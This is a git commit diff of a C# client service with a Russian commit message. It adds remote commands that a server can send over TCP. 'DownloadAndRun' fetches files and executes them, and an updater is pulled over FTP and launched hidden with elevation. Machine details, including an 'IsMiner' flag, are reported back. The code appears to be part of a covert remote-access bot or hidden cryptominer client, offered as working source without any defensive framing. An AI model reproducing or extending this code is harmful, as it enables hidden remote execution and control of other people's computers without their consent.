2e5f28b49f8927236543b06b3fd85796778c5358
Yury <xismatulin.ru@yandex.ru>
2018-02-15 14:56:28 +0500

    Файлменеджер, Хранение данных работы программы, +3 новыхфункции (скачатьизапустить/запросинфодевайс/запросSettings), фиксы лога(Работает правильно) + мелкие фиксы

--- ClientWorker/Service/Functions.cs
+++ ClientWorker/Service/Functions.cs
@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
 using System.Net.Sockets;
@@ -10,55 +11,39 @@ namespace ClientWorker
 {
 	public class Functions
 	{
-        private FtpClient ftpClient = new FtpClient();
 
         public void Start()
 		{
-			ftpClient.Init();
-		}
-
-		public void GetUpdater()
-		{
-			Log.Send("GetUpdater()");
-			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
-			try
-			{
-				KillUpdater();
-				ftpClient.FTPDownloadFile(StartData.updater, folderPath + StartData.floaderNewCopy);
-				new Process
-				{
-					StartInfo = 
-					{
-                        FileName = folderPath + StartData.floaderNewCopy + StartData.updater,
-						WindowStyle = ProcessWindowStyle.Hidden,
-						Verb = "runas",
-						Arguments = Program.nameProcess
-					}
-				}.Start();
-			}
-			catch (Exception ex)
-			{
-				Log.Send("The start process failed: " + ex.ToString());
-			}
-		}
-
-		private void KillUpdater()
-		{
-			foreach (Process process in Process.GetProcessesByName("Updater"))
-			{
-				process.Kill();
-			}
-
-			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
-
-			File.Delete(folderPath + StartData.floaderNewCopy + StartData.updater);
+            
 		}
 
         public void AnalysisAnswer(string answer)
         {
+            string comand = answer.Split('_')[0];
+            List<string> parametrs = new List<string>();
+            parametrs.AddRange(answer.Split('_'));
+            parametrs.Remove(comand);
 
-            switch (answer)
+            switch (comand)
             {
+                case "GetInfoDevice":
+                    SendInfoDevice();
+                    Log.Send("SendInfoDevice()");
+                    break;
+
+                case "GetSettings":
+                    SendSetting();
+                    Log.Send("SendSetting()");
+                    break;
+
+                case "DownloadAndRun":
+                    foreach (string prm in parametrs)
+                    {
+                        FileManager.GetFileAndRun(prm);
+                    }
+                    Log.Send("DownloadAndRun()");
+                    break;
+
                 case "DownloadUpdater":
                     GetUpdater();
                     Log.Send("GetUpdater()");
@@ -66,6 +51,7 @@ namespace ClientWorker
 
                 case "GetLogList":
                     SendLogList();
+                    Log.Send("SendLogList()");
                     break;
 
                 case "Reconnect":
@@ -80,7 +66,43 @@ namespace ClientWorker
             }
         }
 
-		public void Reconnect()
+        public void GetUpdater()
+        {
+            Log.Send("GetUpdater()");
+            string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+            try
+            {
+                KillUpdater();
+                FtpClient.FTPDownloadFile(StartData.updater, folderPath + StartData.floaderNewCopy);
+                new Process
+                {
+                    StartInfo =
+                    {
+                        FileName = folderPath + StartData.floaderNewCopy + StartData.updater,
+                        WindowStyle = ProcessWindowStyle.Hidden,
+                        Verb = "runas",
+                        Arguments = Program.nameProcess
+                    }
+                }.Start();
+            }
+            catch (Exception ex)
+            {
+                Log.Send("The start process failed: " + ex.ToString());
+            }
+        }
+
+        private void KillUpdater()
+        {
+            foreach (Process process in Process.GetProcessesByName("Updater"))
+            {
+                process.Kill();
+            }
+
+            string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+
+            File.Delete(folderPath + StartData.floaderNewCopy + StartData.updater);
+        }
+        public void Reconnect()
 		{
 			Log.Send("Reconnect()");
 			try
@@ -97,15 +119,35 @@ namespace ClientWorker
 			Program.clientThread.Start();
 		}
 
-		private void SendLogList()
+        private void SendSetting()
+        {
+            NetworkStream stream = Program.client.stream;
+            byte[] bytes;
+
+            bytes = Encoding.Unicode.GetBytes(Service.Properties.Settings.Default.Comp_name + StartData.delimiter +
+                Service.Properties.Settings.Default.IsMiner + StartData.delimiter +
+                Service.Properties.Settings.Default.Open_sum + StartData.delimiter +
+                Service.Properties.Settings.Default.Start_time + StartData.delimiter +
+                Service.Properties.Settings.Default.Version);
+
+            stream.Write(bytes, 0, bytes.Length);
+
+            bytes = Encoding.Unicode.GetBytes("EndSetting");
+            stream.Write(bytes, 0, bytes.Length);
+        }
+        private void SendInfoDevice()
+        {
+
+        }
+        private void SendLogList()
 		{
-			Log.Send("SendLogList()");
 			NetworkStream stream = Program.client.stream;
 			byte[] bytes;
 			foreach (string s in Log.messages)
 			{
 				bytes = Encoding.Unicode.GetBytes(s);
 				stream.Write(bytes, 0, bytes.Length);
+                Thread.Sleep(0);
 			}
 			bytes = Encoding.Unicode.GetBytes("EndLog");
 			stream.Write(bytes, 0, bytes.Length);
